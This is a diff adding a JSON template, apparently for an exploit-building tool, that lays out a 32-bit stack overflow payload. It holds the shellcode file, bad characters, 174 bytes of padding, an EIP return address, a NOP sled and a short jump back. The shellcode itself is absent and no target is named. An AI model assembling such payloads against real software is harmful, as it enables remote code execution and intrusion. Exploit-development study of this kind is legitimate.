@@ -1,0 +1,40 @@
+{
+  "_comment": "Classic 32-bit EIP overwrite.",
+  "_comment2": "Generate sc.bin externally: e.g. save raw shellcode bytes to this file.",
+  "_comment3": "Two padding strategies are shown — use ONE of pad_count or pad_to_offset.",
+
+  "badchars": "000a0d",
+
+  "segments": [
+    {
+      "name": "shellcode",
+      "bytes_file": "sc.bin",
+      "_comment": "Load any .bin file — no size constraint"
+    },
+    {
+      "name": "padding",
+      "pad_count": 174,
+      "pad_byte": "0x41",
+      "_comment": "Use pad_count when you know the exact gap length"
+    },
+    {
+      "name": "ret",
+      "value": "0x14802400",
+      "width": 4,
+      "endian": "little",
+      "_comment": "EIP overwrite value"
+    },
+    {
+      "name": "nop_sled",
+      "repeat": { "byte": "0x90", "count": 32 }
+    },
+    {
+      "name": "pivot_stub",
+      "computed": {
+        "function": "short_jump_back",
+        "args": { "distance": 32 }
+      },
+      "_comment": "Register your own functions in computed_registry.py"
+    }
+  ]
+}
